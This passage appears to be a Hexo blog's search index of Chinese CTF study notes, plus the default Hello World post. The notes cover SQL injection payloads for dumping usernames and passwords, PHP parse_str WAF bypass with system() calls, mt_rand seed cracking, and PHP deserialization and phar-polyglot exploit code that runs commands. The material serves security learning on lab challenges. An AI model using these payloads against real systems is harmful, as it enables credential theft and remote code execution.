返回字符串最左边的几个字符\n\n```sql\nselect left('mysql', 2);\n```\n\n**SLEEP()** 让此语句运行N秒钟\n\n```sql\nselect sleep(N);\nselect if(1>2,2,3); -- 3 若第一个参数为真，则返回第一个参数，否则第二个\n```\n\n**STRCMP()**\n\n```sql\nselect strcmp('a', 'b'); # -1\nselect strcmp('a', 'a'); # 0\nselect strcmp('c', 'b'); # 1\n```\n\n**IFNULL()** 假如参数1不为null，则返回值为参数1，否则返回值为参数2\n\n```sql\nselect ifnull(1/0, 2); --2.0000\n```\n\n**exp()** 返回e的x次方\n\n```sql\nselect exp(1); --2.71828\n```\n\n## SQL基本语句\n\n```sql\nshow databases; #显示所有数据库\nuse 数据库名字; #使用数据库\nshow tables; #显示所有表单\n```\n\nSELECT 列名称 FROM 表名称 WHERE 条件 #从表中选取数据\n\n```sql\nSelect* from user where name = 'xxx';  #*表示所有列\n```\n\nUPDATE 表名称 SET 列名称 = 新值 WHERE 条件 #修改表中某只 ex:\n\n```sql\ninsert into 表名称(字段名称) values (值1, 值2)\ndelete from (表) where 条件\n```\n\nunion select 联合查询\n\nUNION操作符用于合并两个或多个SELECT语句的结果集（UNION内部的每个SELECT语句必须拥有相同数量的列，列也必须拥有相似的数据类型，同时每个SELECT语句中的列的顺序必须相同）\n\n```sql\nSELECT column_name(s) FROM table_name1\nUNION\nSELECT column_name(s) FROM table_name2\n```\n\n## 万能密码备忘\n\n```sql\n' or ' 1=1 #\nor 1=1 --\n```\n\n分析万能密码如何被解析 通过闭合引号以及注释后面的内容\n\n```sql\nselect * from users where username '\n'or '1' = '1' # 输入的内容\n' and pwd= '\n'or '1'='1 # 输入的内容\n'\n```\n\n## 查询数据核心语法\n\n获取当前数据库用户、名称、版本信息\n\n```sql\nselect user(), database(), version from dual;\n```\n\n**查库**\n\n```sql\nselect schema_name from information_schema.schemata\n```\n\n**查表**\n\n```sql\nselect table_name from information_schema.tables where table_schema=库名\n# 方法1\nselect group_concat(table_name) from information_schema.tables where table_schema=database();\n# 方法2\nselect table_name from information_schema.tables where table_schema='database_name';\n# 方法3\nselect table_name from information_schema.tables where table_schema=(select database());\n```\n\n**查列**\n\n```sql\nselect column_name from information_schema.columns where table_name='表名';\n```\n\n**查数据**\n\n```sql\nselect 列名 from 库名.表名\n```\n\n若数据太多导致无法返回查询结果\n\n查询：可以用limit限定返回的数量和位置回显\n\n若页面只能回显一条数据，可以使用concat 语句\n\n```sql\nselect group_concat(schema_name) from information_schema.schemata;\n```\n\n爆库的过程中可以使用 concat_ws 使得数据更清晰(加入-作为分隔符)\n\n```sql\nunion select 1,2(select concat_ws('-',username,password) from security.users limit 0, 1) --+)\n```\n\n### UNION注入\n\nunion操作符用于合并两个及以上的多个SELECT语句的结果集 注意：UNION内部的SELECT语句必须拥有相同数量的列，列要拥有相似的数据类型，且每条SELECT语句的列的顺序必须相同，默认是选取不同的值，若允许重复的值需要使用UNION ALL\n\n```sql\nSELECT column_name(s) FROM table_name1\nUNION\nSELECT column_name(s) FROM table_name2\n```\n\n**注意：** 1.**只有最后有个SELECT语句允许有ORDER BY**\n\n```sql\nselect * from users order by id union selet 1,2,3; -- 错误\n```\n\n2.**只有最后有个SELECT子句允许有LIMIT**\n\n~~~sql\nselect * from users limit 0,1 union select 1,2,3; -- 错误\n```se\n3.**只要UNION连接的几个查询的字段数一样且列的数据类型转换没有问题即可查询出结果**\n4.**注入点页面要有回显**\n\n#### 注意流程\n1.ORDER BY 确定列数 二分法快速判断\n2.观察页面返回，选取可以显示数据的位置，继续注入\n3.读库信息\n4.读表信息\n5.读字段\n6.读数据\n\n详细试水案例\nLess-1\n```sql\n1` order by 3 --+\n1' order by 4 --+\n~~~\n\n所以利用报错信息，得到列数为3\n\n```sql\nid=' union select 1,2,3 --+\n```\n\n理解：原本表中有3列，id name password union select 1,2,3对应了3列，所以数字2和3出现在了name和password的位置 所以可以利用这两列的位置进行注入和回显信息\n\nsql语句分析：\n\n```sql\nselect * from users where id=1 union select 1,2,3;\n```\n\n**爆表名**\n\n```sql\n-- 方式1 一条一条爆\nselect * from users where id=-1 union select 1,(select schema_name from information_schema.schemata limit 0,1),3;\n-- 方式2 拼接的方式爆出所有表\nselect * from users where id=-1 union select 1,(select group_concat( schema_name) from information_schema.schemata),3;\n```\n\n\n\n注入语句：\n\n```sql\n' union select 1,2,(select schema_name from information_schema.schemata limit 4,1)--+\n' union select 1,2,(select group_concat(schema_name) from information_schema.schemata) --+\n```\n\nemmm显然应该(或许大概)是这张security库啦 **读表信息**\n\n```sql\nselect * from users where id=-1 union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema='security');\n```\n\n注入语句：\n\n```sql\nselect * from users where id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'\n' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security' --+\n```\n\n要读取账户密码，所以选择users表\n\n**读段信息**\n\n```sql\nselect * from users where id=-1 union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users');\n```\n\n注入语句：\n\n```sql\n' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+\n```\n\n直接读取username和password就可以\n\n**读数据**\n\n```sql\n` union select 1,2,concat_ws(';',username,password) from users limit 0,1--+\n```\n\n注：可以使用库名的十六进制代替 database() 当前表\n\n\n\n补充一些内容： 字段数判断 SELECT * FROM users limit 1,1 into @,@,@\n\nconcat函数在连接字符串时，只要其中一个是null，将返回null\n\nconcat_ws则会返回不为null的部分\n\n```sql\nselect concat('1', '2', null)\nselect concat_ws(',', '1', '2',null)\n```\n\n## 例题\n\n### CTFHub-Sql注入\n\n#### 整数型注入\n\npayload：\n```sql\n1 and 1=1 回显正常\n1 and 1=2 无回显\n\n-1 union select 1,database() # 回显当前库名是sqli\n\n-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli' #爆出表名 news, flag\n-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='flag' #爆出列名flag\n\n-1 union select 1, group_concat(flag) from sqli.flag #爆flag\n\n```\n#### 字符型注入\n\n```\n1'\n```\n回显：\nselect * from news where id='1''\n。。。\npayload:\n\n```sql\n1' order by 2# 回显正常，得2列\n\n-1' union select 1,database()# 得库名sqli\n\n-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'# 得表名 news flag\n\n-1' union select 1,group_concat(column_name) from information_schema.columns where table_schema='sqli'# 得列名id,data,flag\n\n-1' union select 1, group_concat(flag) from sqli.flag # 得flag\n```"},{"title":"php字符串解析trick","url":"/2022/01/20/php字符串解析trick/","content":"\n# php字符串解析trick\n\n## parse_str\n\n将字符串解析成多个变量\n\n> parse_str( string $encoded_string[, array &$result] ) : void\n\n主要作用直接放例子（这里乱起的名字）\n\n```php\n$str = \"id=noname\";\nparse_str($str, $output);\nprint_r($output);//Array ( [id] => noname )\n\n$str = \"id num=noname\";\nparse_str($str, $output);\nprint_r($output);// Array ( [id_num] => noname )\n\n$str = \"id%5bnum=noname\";\nparse_str($str, $output);\nprint_r($output);// Array ( [id_num] => noname )\n```\n\n所以可以看出，经过parse_str的处理，会先将空格去除后，再将特殊符号替代成`_`\n\n可以跑脚本fuzz一下还有哪些替代\n\n## 例题\n\n### [RoarCTF 2019]Easy Calc\n\n只看重要的waf代码\n\n```php\n<?php\nerror_reporting(0);\nif(!isset($_GET['num'])){\n    show_source(__FILE__);\n}else{\n        $str = $_GET['num'];\n        $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]','\\$','\\\\','\\^'];\n        foreach ($blacklist as $blackitem) {\n                if (preg_match('/' . $blackitem . '/m', $str)) {\n                        die(\"what are you want to do?\");\n                }\n        }\n        eval('echo '.$str.';');\n}\n?>\n```\n\n这里会检查num中有没有黑名单中的元素，可以在num前加个空格，即`?%20num=`，经过php的处理，`%20num`和`num`是不一样的变量，就可以绕过这层waf\n\npayload:\n\n```\n? num=system('ls');\n```\n\n### [nuaactf2021]base64\n\n```php\n<?php\nerror_reporting(0);\n\nfunction is_ok($c)\n{\n    if (preg_match('/[0-9a-zA-Z]{2}/',$c) === 1) //不能连续两个字母或数字\n    {\n        die(\"Get out of my site!\");\n    }\n    return 1;\n}\n\nif (isset($_POST['p']) )\n{\n    $p = $_POST['p'];\n    if (is_ok($p) === 1)\n    {\n        $pp = trim(base64_decode($p));\n        @include($pp);\n    }\n}\n\nhighlight_file(__FILE__);\n\n?>\n```\n\n这里就是利用`base64_decode`忽略空格\n\n可以利用include读取文件，post传一个php://filter/read=convert.base64-encode/resource=flag.php的base64码\n\n```\np=c G h w O i 8 v Z m l s d G V y L 3 J l Y W Q 9 Y 2 9 u d m V y d C 5 i Y X N l N j Q t Z W 5 j b 2 R l L 3 J l c 2 9 1 c m N l P W Z s Y W c u c G h w\n```\n\n## Another trick\n\n// 留坑\n\n\n\nReference\n\nhttps://moonback1314.gitee.io/2020/01/17/PHP%E7%9A%84%E5%AD%97%E7%AC%A6%E4%B8%B2%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7/","tags":["web"]},{"title":"php伪随机数","url":"/2022/01/20/php伪随机数/","content":"\n# php伪随机数\n\n// 图裂\n题目给了一个简短的字符串，但是一共有二十位，所以后面有一部分需要自己爆出来\n爆源码的多种姿势后。。\n\n源码显示随机生成了一个字符串，所以要通过伪随机数的预测来破解\n相关函数：\n\n```php\nmt_rand( void) : int\nmt_rand( int $min, int $max) : int\n```\n\n缺陷：生成的随机数跟seed和调用该函数的次数有关，也就是只要种子是一样的，任何人拿该种子去生成的随机数都是可预测的，顾名思义伪随机数\n所以解决方法就是要找到该种子\n\n```php\nmt_srand([ int $seed] ) : void\n```\n\n用 seed 来给随机数发生器设置种子。 没有设定 seed 参数时，会被设为随时数(一般可以根据本地时间，来使得rand一类函数得到的数字达到随机的效果)。使用者在进行一次mt_srand()操作后，seed数值将被固定下来，给接下来的mt_rand()函数使用。\n\n参考一篇解析原理的文章\nhttps://www.freebuf.com/column/205240.html\n\n使用工具：\n\n```\nhttp://www.openwall.com/php_mt_seed/\n```\n\n这里如果版本对应不正确是安排不了的，很奇怪\n将压缩包拉到linux下\n\n```\ntar -zxvf php_mt_seed-4.0.tar.gz\ncd到目录下后\nmake\n```\n\n这里顺便学习一下make命令\nhttp://www.ruanyifeng.com/blog/2015/02/make.html\n\n根据README，我们要将数据处理成便于种子爆破的格式，所以要根据源码写脚本进行数据处理，即获取\"样本随机数\"\n\nhttps://github.com/lepiaf/php_mt_seed\n根据源码的思路逆向\n脚本：\n\n```py\nstr1 = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'\nstr2 = 'Z7M56fQQBN'\nres = ''\nfor i in range(len(str2)):\n\tfor j in range(len(str1)):\n\t\tif(str2[i] == str1[j]):\n\t\t\tres += str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '\n\t\t\tbreak\nprint(res)\n```\n\n得到一串数据\n进到目录里丢到php_mt_seed中\n\n```bash\n./php_mt_seed ....\n```\n\n可以得到种子和php版本\n\n```php\n<?php\nmt_srand(474122877);\n$str_long1 = \"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ\";\n$str='';\n$len1=20;\nfor ( $i = 0; $i < $len1; $i++ ){\n    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       \n}\necho \"<p id='p1'>\".$str.\"</p>\";\n```\n\n最后这里同样是要注意php的版本，只好即可得flag\n\n"},{"title":"php反序列化","url":"/2022/01/20/php反序列化/","content":"\n# php反序列化\n\n## 相关概念\n\n### 序列化\n\n序列化的过程是将各种类和属性的信息转化成**便于存储**的字节流，也就是将数据信息进行一定格式的压缩存储\n\n```php\n<?php\n\tclass Person{\n\t\tpublic $name = 'noname';\n\t\tprotected $id = '666';\n\t\tprivate $password = 'root123';\n\n\t\tpublic function set_Pwd($password)\n\t\t{\n\t\t\t$this->password = $password;\n\t\t}\n\n\t\tpublic function get_Pwd($password)\n\t\t{\n\t\t\treturn $this->password;\n\t\t}\n\t}\n\t$p = new Person();\n\techo serialize($p);\n\n?>\n```\n\n不同的权限序列化的结果不一样\n\n| 权限      | 序列化结果            |\n| --------- | --------------------- |\n| Public    | 与序列化前相同        |\n| Protected | \\x00+*+\\x00+变量名    |\n| Private   | \\x00+类名+\\x00+变量名 |\n\n![6c7f78dc4a47a847fa98511d45bc1e6e.png](en-resource://database/618:1)\n\n### 反序列化\n\n把字节流转换成对象实例\n\n## php反序列化漏洞\n\n当反序列化的参数可控时，可以传入一个构造过的序列化字符串控制对象内部的变量或函数\n所以**反序列化函数**和**参数可控**是必备条件\n魔术方法：\n\n| 函数          | 触发条件                                                   |\n| ------------- | ---------------------------------------------------------- |\n| __construct() | 当一个对象创建时被调用,但在unserialize()时是不会自动调用的 |\n| __destruct()  | 当一个对象销毁时被调用                                     |\n| __toString()  | 当一个对象被当作一个字符串使用时被调用                     |\n| __sleep()     | serialize()时会自动调用                                    |\n| __wakeup()    | unserialize()时会自动调用                                  |\n| __call()      | 当调用对象中不存在的方法会自动调用该方法                   |\n| __get()       | 在调用私有属性的时候会自动执行                             |\n| __isset()     | 在不可访问的属性上调用isset()或empty()触发                 |\n| __unset()     | 在不可访问的属性上使用unset()时触发                        |\n| __invoke()    | 当脚本尝试将对象调用为函数时触发                           |\n\nhttps://www.php.net/manual/zh/language.oop5.magic.php\n\ndemo.php\n\n```php\n<?php\n\tclass User{\n\t\tprivate $test;\n\n\t\t//构造\n\t\tfunction __construct(){\n\t\t\t$this->test = new Welcome();\n\t\t}\n\n\t\tfunction __destruct(){\n\t\t\t$this->test->action();\n\t\t}\n\t}\n\n\tclass Welcome{\n\t\tfunction action(){\n\t\t\techo \"Welcome~\";\n\t\t}\n\t\t\n\t}\n\n\tclass Devil{\t\n\t\tprivate $data;\n\t\tfunction action(){\n\t\t\teval($this->data);//恶意代码\n\t\t}\n\t}\n\t\n\tunserialize($_GET['a']);\n?>\n```\n\n这里很明显是要利用eval这个恶意函数，重点就是要如何调用到这个类中的action函数\ntest\npoc.php\n\n```php\n<?php\n\tclass User{\n\t\tprivate $test;\n\n\t\t//构造\n\t\tfunction __construct(){\n\t\t\t$this->test = new Devil();\n\t\t}\n\n\t\t//销毁时执行\n\t\tfunction __destruct(){\n\t\t\t$this->test->action();\n\t\t}\n\t}\n\n\tclass Devil\n\t{\t\n\t\tprivate $data = 'phpinfo();';\n\t\t//执行内容\n\t\tfunction action(){\n\t\t\teval($this->data);\n\t\t}\n\t}\n\t\n\t$user = new User();\n\t$output = serialize($user);\n\techo $output;\n?>\n```\n\n## pop链\n\n其实上面的利用已经是小型的pop链，主要就是通过触发函数，导致接下来分析两道题\n\n#### Example1\n\n```php\n<?php\nerror_reporting(0);$flag=file_get_contents('/flag');highlight_file(__FILE__);\nclass Admin{\n    public $username;\n    public $password;\n    function __construct($username, $password)\n    {\n        $this->username = $username;\n        $this->password = $password;\n    }\n    function __toString()\n    {\n        $this->login($this->username, $this->password);\n    }\n    function login($username, $password)\n    {\n        $username = addslashes($username);\n        $password = addslashes($password);\n        if ($username === 'admin' && $password === 'admin') {\n            global $flag;\n            echo $flag;\n        }\n    }\n    function ban()\n    {\n        $times = 10 - (int)$_COOKIE['times'];\n        if ($times <= 0) {\n            die(\"You have been banned\");\n        } else {\n            $times -= 1;\n            setcookie('times', 10 - $times);\n            die(\"You have $times times to try.\");\n        }\n    }\n}\nclass Guest{\n    public $username;\n    public $password;\n    public $role;\n    function __construct($username, $password)\n    {\n        $this->username = $username;\n        $this->password = $password;\n        $this->role = 0;\n    }\n    function __call($method, $args)\n    {\n        $this->login($this->username, $this->password);\n    }\n    function login($username, $password)\n    {\n        $username = addslashes($username);\n        $password = addslashes($password);\n        if ($username === 'guest' && $password === 'guest') {\n            $this->role = 0;\n        }\n    }\n}\nclass User{\n    public $username;\n    public $password;\n    public $role;\n    public $admin;\n    function __construct($username, $password)\n    {\n        $this->username = $username;\n        $this->password = $password;\n        $this->role = 0;\n        $this->admin = new Admin($username, $password);\n    }\n    function __wakeup()\n    {\n        $this->login($this->username, $this->password);\n    }\n    function login($username, $password)\n    {\n        // var_dump($username);\n        if (isset($username) && isset($password)) {\n            if ($username === 'guest' && $password === 'guest') {\n                $this->role = 0;\n                $this->admin->ban();\n            }\n        }\n    }\n}\nif (!isset($_COOKIE['times'])) {\n    setcookie('times', 0);\n}unserialize($_GET['p']);\n```\n\n这里通过分析魔法函数的触发条件，可以得到一个链子\npop链：\n\n```\nUser->__wakeup => User->login => Guest->__call => Guest->login =>Admin->__toString => Admin->login \n```\n\n在实例化三个类的对象后，将User类对象的admin赋值为Guest类的对象，使其能满足\n\n```php\n if ($username === 'guest' && $password === 'guest') {                 \n    $this->role = 0;                 \n    $this->admin->ban();           \n}\n```\n\n触发Guest类中不存在的ban()，从而触发__call()，最终完成整条链\n\nexp\n\n```php\n<?php\nclass Admin\n{\n    public $username = 'admin';\n    public $password = 'admin';\n\n}\n\nclass Guest\n{\n    public $username = 'guest';\n    public $password = 'guest';\n    public $role;\n}\n\nclass User\n{\n    public $username = 'guest';\n    public $password = 'guest';\n    public $role;\n    public $admin;\n\n}\n\n$a = new Admin();\n$g = new Guest();\n$u = new User();\n$g->username = $a;\n$u->admin = $g;\nprint_r($g);\necho '<br>';\necho serialize($u);\n```\n\n#### XCTF-Web_php_unserialize\n\n```php\n<?php class Demo { \n    private $file = 'index.php';\n    public function __construct($file) { \n        $this->file = $file; \n    }\n    function __destruct() { \n        echo @highlight_file($this->file, true); \n    }\n    function __wakeup() { \n        if ($this->file != 'index.php') { \n            //the secret is in the fl4g.php\n            $this->file = 'index.php'; \n        } \n    } \n}\nif (isset($_GET['var'])) { \n    $var = base64_decode($_GET['var']); \n    if (preg_match('/[oc]:\\d+:/i', $var)) { \n        die('stop hacking!'); \n    } else {\n        @unserialize($var); \n    } \n} else { \n    highlight_file(\"index.php\"); \n} ?>\n```\n\nGET传入$var\n正则绕过preg_match ->在不区分大小写的情况下，若字符串出现o:数字 / c:数字 ，则会被过滤，但是如果要序列化，会出现Q\n绕过weakup\nbase64加密\n这是正常逻辑\n\n```php\n# 实例化Demo对象\n$obj = new Demo(\"fl4g.php\");\n# 序列化对象\n$str = serialize($obj);\n# 输出字符串\necho $str, PHP_EOL;\n```\n\n```php\n$A = new Demo ('fl4g.php');\n$C = serialize($A);                     //改变属性绕过wake up 函数\n$C = str_replace('O:4','O:+4',$C);      //绕过正则表达式过滤\n$C = str_replace(':1:',':2:',$C); \nvar_dump($C);\nvar_dump(base64_encode($C));            //base64加密\n```\n\n## phar扩展反序列化攻击面\n\n前面的代码都是在通过控制参数，利用unserialize这个函数进行反序列化利用。而phar可以在没有unserialize的情况下进行反序列化。\n\n这里用phar对文件进行压缩时会进行序列化，用phar://协议对phar进行文件操作的时候会进行反序列化，进而扩展了攻击面\n限制：\n\n>phar文件要能够上传到服务器端。\n>要有可用的魔术方法作为“跳板”。\n>文件操作函数的参数可控，且:、/、phar等特殊字符没有被过滤。\n\n```php\n<?php\n    class test{\n        function __destruct(){\n            echo \"Destruct called\"；\n        }\n    }\n    \n    $filename = 'phar://phar.phar/test.txt';\n    file_get_contents($filename);\n?>\n```\n\n### phar文件\n\nphar是一种压缩格式的文件，有四个构成部分\n1.stub\n格式：\n\n```\nxxx<?php xxx; __HALT_COMPILER();?>\n```\n\n前面内容不限但必须以`__HALT_COMPILER();?>`结尾，否则phar扩展无法识别这个文件为phar文件\n2.manifest describing the contents\n被压缩文件的权限属性。会以**序列化**的形式存储用户自定义的meta-data。\n3.contents\n被压缩文件的内容\n4.signature\n签名，在文件末尾\n\n#### 受影响的函数\n\n![99cf31f015aa9eaf557de539d5ee9b28.png](en-resource://database/619:1)\n\n#### 生成phar文件\n\n修改本地`php.ini`\n\n```\nphar.readonly = Off\n```\n\n注意：php版本要在5.3以上，修改配置文件时要去掉分号\n生成phar文件\n\n```php\n<?php\n    class TestObject {\n    }\n\n    @unlink(\"phar.phar\");\n    $phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n    $phar->startBuffering();\n    $phar->setStub(\"<?php __HALT_COMPILER(); ?>\"); //设置stub\n    $o = new TestObject();\n    $phar->setMetadata($o); //将自定义的meta-data存入manifest\n    $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n    //签名自动计算\n    $phar->stopBuffering();\n?>\n```\n\n#### 伪造phar文件\n\n```php\n$phar->setStub(\"GIF89a\".\"<?php __HALT_COMPILER(); ?>\"); //设置stub，增加gif文件头\n```\n\n可以绕过上传检测\n\n#### Example\n\n题目就只有一个上传功能\n\nshow_image.php\n\n```php\n<?php \ninclude(\"versioncomp.php\");\n\necho \"<h1>图片预览器</h1>\";\n$file_name=$_GET['filename'];\n\nif(!isset($file_name)){\n\t$file_name='./upload_file/background.gif';\n}\n\nif(file_exists($file_name)){\n\techo \"<br><img widht=800 height=600 src=\\\"\".$file_name.\"\\\"><br>\";\n}else{\n\n\techo \"还未上传图片\";  \n\n}\n\n?>\n```\n\nupload_file.php\n只允许上传gif，且最后都是`upload_file/background.gif`\n\n```php\n<body>\n<form action=\"./upload_file.php\" method=\"post\" enctype=\"multipart/form-data\">\n    <input type=\"file\" name=\"file\" />\n    <input type=\"submit\" name=\"Upload\" />\n</form>\n</body>\n<?php\nerror_reporting(0);\n$file_dir=\"./upload_file/\";\nif(!is_dir($file_dir)){\nmkdir($file_dir,0777,true);\n}\nif (($_FILES[\"file\"][\"type\"]==\"image/gif\")&&(substr($_FILES[\"file\"][\"name\"], strrpos($_FILES[\"file\"][\"name\"], '.')+1))== 'gif') {\n    echo \"Upload: \" . $_FILES[\"file\"][\"name\"].\"<br>\";\n    echo \"Type: \" . $_FILES[\"file\"][\"type\"].\"<br>\";\n      move_uploaded_file($_FILES[\"file\"][\"tmp_name\"],\n      \"upload_file/background.gif\");\n      echo \"Stored in: \" . \"upload_file/background.gif\";\n   echo '<script>window.location.href=\"index.php?file=show_image\"</script>';\n    }\nelse\n  {\n  echo \"you can only upload gif\";\n  }\n```\n\nversioncomp.php\n这里是可以利用的反序列化代码\n\n```php\n<?php\n\nclass FileVersionClass{\n    public $fileSystem_version = 'Version_number';\n    public $output = 'echo \"system version is cahnge\";';\n    function __destruct()\n    {\n    \t$realversion='1.0.0'.$this->fileSystem_version.'bak_version';\n    \tif(version_compare('1.0.0', $realversion)!==1){\n                   eval($this -> output);\n        };\n    }\n}\n```\n\n主要功能就是一个上传，这里限制了只能传gif图，而在FileVersionClass中有一个可以利用的`eval`函数，因为这里没有unserialize函数，所以要利用phar进行一个序列化和反序列化，先是在本地构造出一个phar包，之后利用file_exists配合phar://伪协议进行文件操作，触发反序列化\nphar_gen.php\n\n```php\n<?php\n    class FileVersionClass{\n        public $fileSystem_version = '1.0.0';//这里要注意更改成符合if判断的条件\n        public $output = 'system(\"cat /flag\");';//构造恶意语句\n        function __destruct()\n        {\n            $realversion='1.0.0'.$this->fileSystem_version.'bak_version';\n            if(version_compare('1.0.0', $realversion)!==1){\n                       eval($this -> output);\n            };\n           \n        }\n    }\n\n    $o = new FileVersionClass();\n    $phar = new Phar(\"phar.phar\"); //后缀名必须为phar\n    $phar->startBuffering();\n    $phar->addFromString(\"test.txt\", \"test\"); //添加要压缩的文件\n    $phar->setStub('GIF89a'.'<?php __HALT_COMPILER(); ?>'); //设置stub，伪造gif\n    $phar->setMetadata($o); //将自定义的meta-data存入manifest\n    //签名自动计算\n    $phar->stopBuffering();\n?>\n```\n\n将生成的phar文件后缀改成.gif，上传，站点会给出上传的路径，最后在show_image.php页面进行文件操作\n\n```\nshow_image.php?filename=phar://upload/background.gif\n```\n\n#### bypass\n\n```php\ncompress.zlib://\ncompress.bzip2://\n```\n\n## 反序列化字符逃逸\n\n### 规则\n\n以`;`作为分隔，`}`作为结，并且按照序列化规则才能成功实现反序列化，即长度不符合的时候会报错。\n但是如果符合规则，是可以反序列化类中不存在的元素的\n\n```php\n<?php\nclass Person{\n\tpublic $name = 'noname';\n}\n\nvar_dump(serialize(new Person()));//string(41) \"O:6:\"Person\":1:{s:4:\"name\";s:6:\"noname\";}\"\necho '<br>';\n\n$str = 'O:6:\"Person\":2:{s:4:\"name\";s:6:\"noname\";s:3:\"age\";s:2:\"18\";}';//注意类中的属性数量要改成2\n\nvar_dump(unserialize($str));//object(Person)#1 (2) { [\"name\"]=> string(6) \"noname\" [\"age\"]=> string(2) \"18\" }\n\n?>\n```\n\n所以我们是可以通过构造一个语句来篡改序列化后的对象实例中的属性和值的\n\n### 字符增加的情况\n\n```php\n<?php\n\t//这个函数是做一个字符替换，用yy去替换x\n\tfunction filter($string)\n\t{\n\t\treturn str_replace('a','bb',$string);\n\t};\n\n\t//信息\n\t$user = 'xxl';\n\t$info = 'data';\n\n\t//以数组方式输出\n\t$data = array($user, $info);\n\tvar_dump(serialize($data));//string(35) \"a:2:{i:0;s:3:\"xxx\";i:1;s:4:\"data\";}\"\n\techo '<br>';\n\n\t$output = filter(serialize($data));\n\tvar_dump($output);//string(38) \"bb:2:{i:0;s:3:\"xxx\";i:1;s:4:\"dbbtbb\";}\"\n\techo '<br>';\n?>\n```\n\n## session反序列化\n\n### session存储机制\n\nphp内置多种处理器用于存储$_SESSION数据\n\n| 处理器                    | 对应存储格式                                                 | 实例 |\n| ------------------------- | ------------------------------------------------------------ | ---- |\n| php                       | 键名+竖线+经过serialize()函数反序列化处理的值                |      |\n| php_binary                | 键名的长度对应的ASCII字符+键名+经过serialize()函数反序列化处理的值 |      |\n| php_serialize(php>=5.5.4) | 经过serialize()函数反序列化处理的数组                        |      |\n\n```php\n<?php\nini_set('session.serialize_handler', 'php');\nsession_start();\n$_SESSION['a'] = $_GET['a']\n?>\n\n?a=noname\n\na|s:6:\"noname\";\n```\n\n```php\n<?php\nini_set('session.serialize_handler', 'php_serialize');\nsession_start();\n$_SESSION['a'] = $_GET['a']\n?>\n\n?a=noname\n\na:1:{s:1:\"a\";s:6:\"noname\";}\n```\n\n漏洞在于session的使用不当，在反序列化存储session数据和序列化时使用的引擎不一样，则会导致无法正确反序列化。\n\nphp默认用php引擎进行session存储，即形如`a|s:6:\"noname\";`若对输入没有进行过滤，可以利用竖线和分隔符，将前面变成键，后面构造恶意序列化数据\n\n\n## 原生类利用\n\n### SoapClient+反序列化\n\nSoapClient类触发反序列化+CRLF注入实现SSRF\n\n## 防御方法\n\n1.对unseralize中的参数进行严格过滤\n2.对上传文件的内容进行检查\n\n\nReference：\nhttps://xz.aliyun.com/t/2715\nhttps://www.geek-share.com/detail/2791677381.html\nhttp://123.57.164.1/2020/11/10/ctf%E4%B8%AD%E7%9A%84php%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"Hello World","url":"/2022/01/19/hello-world/","content":"Welcome to [Hexo](https://hexo.io/)! This is your very first post. Check [documentation](https://hexo.io/docs/) for more info. If you get any problems when using Hexo, you can find the answer in [troubleshooting](https://hexo.io/docs/troubleshooting.html) or you can ask me on [GitHub](https://github.com/hexojs/hexo/issues).\n\n## Quick Start\n\n### Create a new post\n\n``` bash\n$ hexo new \"My New Post\"\n```\n\nMore info: [Writing](https://hexo.io/docs/writing.html)\n\n### Run server\n\n``` bash\n$ hexo server\n```\n\nMore info: [Server](https://hexo.io/docs/server.html)\n\n### Generate static files\n\n``` bash\n$ hexo generate\n```\n\nMore info: [Generating](https://hexo.io/docs/generating.html)\n\n### Deploy to remote sites\n\n``` bash\n$ hexo deploy\n```\n\nMore info: [Deployment](https://hexo.io/docs/one-command-deployment.html)\n"}]